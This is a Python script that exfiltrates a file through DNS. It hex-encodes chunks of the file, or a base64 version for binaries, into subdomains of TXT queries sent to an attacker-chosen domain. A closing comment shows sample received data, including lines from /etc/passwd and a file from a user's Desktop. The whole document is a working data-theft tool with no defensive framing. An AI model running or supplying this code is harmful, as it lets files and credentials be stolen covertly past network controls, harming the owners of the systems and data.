#!/usr/bin/env python3

import dns.resolver
import binascii
import argparse
import random
import string
import base64

parser = argparse.ArgumentParser()
parser.add_argument('--domain','-d',required=True)
parser.add_argument('--file','-f',required=True)
args = parser.parse_args()

def break_line(string, length):
	'''split the file line into chunks that can fit into dns query'''
	return (string[0+i:length+i] for i in range(0, len(string), length))

def random_string_digits(string_length=4):
	'''generate a random alpha-num string for file identifier''' 
	letters_and_digits = string.ascii_letters + string.digits
	return ''.join(random.choice(letters_and_digits) for i in range(string_length))

def is_ascii(fn):
	try:
		chunk_size = 512
		while 1:
			chunk = fn.read(chunk_size)
			if '\0' in chunk:
				return 1
			if len(chunk) < chunk_size:
				return 1
	except:	
		return 0

def format_query(line,num):
	for piece in break_line(line.rstrip(),19):
		num = run_query(piece,num)
		num += 1
	return num

def start_query(wf,num,txt):
	if txt is 1:
		for line in wf:
			num = format_query(line,num)
	else:
		num = format_query(wf,num) 
			
def run_query(missing_piece,num):
	'''create a csv of data to piece together later'''
	string = ("%s,%s,%s\n"%(file_id,f'{num:05}',missing_piece))
	'''serialize the data'''
	encoded_string = binascii.hexlify(string.encode('utf-8'))
	'''put together the dns query'''
	tld = ("d.%s.%s.%s"%(encoded_string.decode('utf-8'),file_id,args.domain))
	'''do it!'''
	try:
		dns.resolver.query(tld,'TXT')
	except:
		pass
	num += 1
	return num

file_id =  random_string_digits()
num = 1

'''parse out a file name and create a header for data transfer'''
for header in break_line(args.file,19):
	num = run_query(header,num)


with open (args.file,"r") as work_file:
	'''test if the file is ascii'''
	if is_ascii(work_file) is 1:
		work_file.seek(0)
		start_query(work_file,num,1)
		work_file.close()
	else:
		work_file.close()
		num = run_query('b64encoded',num)
		with open (args.file,'rb') as bin_file:
			enc_bin_file = base64.b64encode(bin_file.read()).decode("utf-8")
			start_query(enc_bin_file,num,0)

exit()

'''
data received will be in the format:

	file_id,sequence_number,data

	ex.
	R9TS,00001,/etc/passwd
	...
	R9TS,00026,nobody:*:-2:-2:U
	R9TS,00026,nobody:*:-2:-2:U
	R9TS,00027,nprivileged User
	R9TS,00027,nprivileged User
	R9TS,00028,:/var/empty:/usr
	R9TS,00028,:/var/empty:/usr
	R9TS,00029,/bin/false
	R9TS,00029,/bin/false

in the case of non-ascii files, the file
will first be base64 encoded prior to 
sending. an additional header statement
will be added to denote b64 encoding.

	ex.
	K0pQ,00001,/Desktop/me.jpg
	K0pQ,00002,b64encoded
	k0pQ,00003,EAD/fxAA/38QAP9
	k0pQ,00004,WWlZKPjo2QkgGS5
	k0pQ,00005,CMAqkAvAKpAOwCq

'''
